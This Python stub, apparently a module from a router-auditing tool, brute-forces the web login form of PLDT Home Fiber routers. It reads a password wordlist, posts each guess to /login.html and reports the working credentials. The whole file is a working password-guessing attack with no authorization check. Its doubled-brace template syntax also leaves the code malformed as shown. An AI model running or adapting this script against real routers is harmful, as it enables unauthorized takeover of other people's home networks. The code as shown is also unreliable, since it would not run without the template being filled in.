# Router Model Stub: PLDT Home Fiber (Generic / Standard)
# Endpoint: /login.html | Form Keys: username / password

def run_audit(target_ip, username, wordlist_path):
    import urllib.request
    import urllib.parse
    import os

    print(f"\n[+] Running PLDT Home Fiber Auditor against {{target_ip}} (/login.html)...")
    target_url = f"http://{{target_ip}}/login.html"
    
    if not os.path.exists(wordlist_path):
        print(f"[!] Wordlist file '{{wordlist_path}}' not found.")
        return

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Loaded {{len(passwords)}} passwords. Target: {{target_url}}")

    for idx, pwd in enumerate(passwords, 1):
        print(f"[Attempt {{idx}}] Testing password: {{pwd}}")
        try:
            form_data = urllib.parse.urlencode({'username': username, 'password': pwd}).encode('utf-8')
            req = urllib.request.Request(
                target_url, 
                data=form_data, 
                headers={{'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded'}}
            )
            
            with urllib.request.urlopen(req, timeout=3) as response:
                html = response.read().decode('utf-8', errors='ignore')
                if response.status == 200 and "login" not in html.lower():
                    print(f"\n[✔] SUCCESS! Credentials found -> Username: {{username}} | Password: {{pwd}}\n")
                    return
        except Exception:
            pass

    print("\n[-] PLDT Home Fiber audit finished. Password not matched.")
